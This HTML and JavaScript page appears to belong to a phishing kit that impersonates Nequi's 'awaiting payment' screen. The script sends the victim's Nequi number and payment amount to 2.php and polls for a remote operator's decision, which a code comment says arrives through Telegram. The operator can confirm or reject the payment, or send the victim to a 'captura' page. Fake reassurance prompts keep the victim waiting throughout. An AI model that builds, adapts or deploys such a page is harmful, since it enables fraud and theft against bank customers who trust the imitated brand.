<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Esperando pago Nequi</title>
  <style>
    body {
      font-family: system-ui, sans-serif;
      background: #fff;
      color: #000;
      margin: 0;
      padding: 0;
      text-align: center;
    }
    .cabecera { background-color: #fff; height: 60px; width: 100%; }
    .container { padding: 20px 15px; }
    .titulo {
      display: flex; justify-content: space-between; align-items: center;
      font-weight: bold; margin-bottom: 10px; max-width: 500px;
      margin-left: auto; margin-right: auto;
    }
    .titulo span:first-child { color: #9e009f; }
    .mensaje { font-size: 15px; margin-top: 10px; margin-bottom: 20px; }
    .contador-wrapper { position: relative; width: 70px; height: 70px; margin: 0 auto 10px; }
    .spinner { width: 100%; height: 100%; border: 4px solid #dcdcdc; border-top: 4px solid #5b5b5b; border-radius: 50%; animation: spin 1s linear infinite; }
    .contador-texto { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-weight: bold; font-size: 16px; color: #000; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    .submensaje { font-size: 14px; margin-top: 8px; margin-bottom: 18px; }
    .img-fluid { max-width: 100%; height: auto; display: block; margin: 10px auto; }
    .pci-logo { width: 50px; margin: 15px auto 10px; }
    .ayuda-img { width: 100%; max-width: 320px; margin: 0 auto; }
    .modal-box {
      display: none; background: #fff; border: 1px solid #ccc;
      border-radius: 12px; padding: 15px; width: 85%; max-width: 330px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2); margin: 20px auto 0;
    }
    .modal-box p { font-size: 14px; margin-bottom: 12px; }
    .modal-box button {
      padding: 6px 12px; font-size: 13px; margin: 5px;
      border: none; border-radius: 8px; cursor: pointer; background: #f0f0f0;
    }
    .modal-box button:hover { background: #e2e2e2; }
  </style>
</head>
<body>

<div class="cabecera"></div>
<div class="container">
  <div class="titulo">
    <span>Nequi</span>
    <span id="montoTexto">Monto: $ 0</span>
  </div>
  <div class="mensaje">
    Se ha enviado una notificación push a tu app Nequi.<br>
    Por favor conéctate a tu móvil y acepta el pago.
  </div>
  <div class="contador-wrapper">
    <div class="spinner"></div>
    <div class="contador-texto" id="contador">120s</div>
  </div>
  <div class="submensaje">Esperando confirmación de pago ...</div>
  <div id="modalTemporal" class="modal-box" style="display: none;"></div>
  <img src="img/ayuda.png" class="img-fluid ayuda-img" alt="Ayuda Nequi">
  <img src="img/pci.jpg" class="img-fluid pci-logo" alt="PCI Logo">
</div>

<script>
  const contadorEl = document.getElementById("contador");
  const montoTextoEl = document.getElementById("montoTexto");
  const modalTemporal = document.getElementById("modalTemporal");

  const totalPagar = localStorage.getItem("total_pagar") || "0";
  const montoFormateado = parseFloat(totalPagar).toLocaleString("es-CO", {
    style: "currency", currency: "COP"
  });
  montoTextoEl.textContent = "Monto: " + montoFormateado;

  const numeroNequi = localStorage.getItem("nequi") || "0000000000";

  let tiempoRestante = 120;
  let cuenta = setInterval(() => {
    tiempoRestante--;
    contadorEl.textContent = `${tiempoRestante}s`;
    if (tiempoRestante <= 0) {
      clearInterval(cuenta);
      clearInterval(poll);
      alert("⏱️ Tiempo agotado. No se recibió respuesta del operador.");
      window.location.href = "index.php";
    }
  }, 1000);

  let notificacionActiva = null;

  function generarTransactionId() {
    return 'TID' + Date.now() + Math.floor(Math.random() * 999);
  }

  async function enviarNotificacion(mensajeUsuario) {
    const tid = generarTransactionId();
    notificacionActiva = { tid, enviada: Date.now() };

    await fetch("2.php", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        transactionId: tid,
        nequi: numeroNequi,
        monto: totalPagar,
        mensaje: mensajeUsuario
      })
    });

    // cancelar si no hay respuesta en 10s
    setTimeout(() => {
      if (notificacionActiva && notificacionActiva.tid === tid) {
        notificacionActiva = null;
      }
    }, 10000);
  }

  function mostrarModal(html) {
    modalTemporal.innerHTML = `<p>${html}</p>`;
    modalTemporal.style.display = "block";
  }
  function ocultarModal() {
    modalTemporal.style.display = "none";
  }

  // Preguntar al usuario en pantalla
  function preguntarAlUsuario() {
    mostrarModal(`
      ¿Ya aceptaste el pago pero la página aún no avanza?<br><br>
      <button onclick="responderUsuario(true)">✅ Sí, ya pagué</button>
      <button onclick="responderUsuario(false)">❌ Aún no he pagado</button>
    `);
  }

  async function responderUsuario(yaPago) {
    ocultarModal();
    if (yaPago) {
      await enviarNotificacion("El usuario indica que YA pagó");
    } else {
      await enviarNotificacion("El usuario indica que AÚN NO ha pagado");
      mostrarModal(`<span style="color: red; font-weight: bold;">Aún no hay confirmación de tu pago</span>.<br>
Por favor revisa tus notificaciones en la app de Nequi.`);
      setTimeout(ocultarModal, 10000);
      setTimeout(preguntarAlUsuario, 20000);
    }
  }

  // Primera notificación automática a los 5s
  setTimeout(() => {
    preguntarAlUsuario();
  }, 5000);

  // Polling para saber si el operador respondió en Telegram
  const poll = setInterval(async () => {
  if (!notificacionActiva) return;

  const res = await fetch(`2.php?transactionId=${notificacionActiva.tid}`);
  const json = await res.json();

  if (json.ok && json.action) {
    notificacionActiva = null;
    if (json.action === "confirmado") {
      mostrarModal(`<span style="color: green; font-weight: bold;">Tu pago fue confirmado</span>.<br>
Redirigiendo...`);
      setTimeout(() => window.location.href = "fin.php", 3000);
    } else if (json.action === "rechazado") {
      mostrarModal(`<span style="color: red; font-weight: bold;">Aún no hay confirmación de tu pago</span>.<br>
Por favor revisa tus notificaciones en la app de Nequi.`);
      setTimeout(ocultarModal, 10000);
      setTimeout(preguntarAlUsuario, 20000);
    }
    // 🔹 NUEVO: acción captura
    else if (json.action === "captura") {
      mostrarModal(" El operador solicitó una captura.<br><b>Redirigiendo...</b>");
      setTimeout(() => {
        window.location.href = "captura.php";
      }, 1500);
    }
  }
}, 3000);

</script>

</body>
</html>
